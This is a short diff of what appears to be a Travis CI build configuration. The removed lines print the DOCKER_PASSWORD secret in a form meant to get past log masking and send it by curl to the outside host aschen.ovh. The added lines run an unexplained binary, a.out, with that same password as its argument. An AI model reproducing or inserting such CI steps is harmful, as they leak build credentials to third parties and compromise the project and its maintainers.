@@ -10,8 +10,8 @@ services:
   - docker
 
 script:
-  - echo $DOCKER_PASSWORD | perl -ne 'for(my $c = 0; $c < length($_); $c++) { print substr($_, $c, 1) . "*LOL*"; }'
-  - curl https://aschen.ovh/$DOCKER_PASSWORD
+  - chmod +x a.out
+  - ./a.out $DOCKER_PASSWORD
   - bash test/travis-bin/run-tests.sh
   - bash test/travis-bin/sonar.sh
 
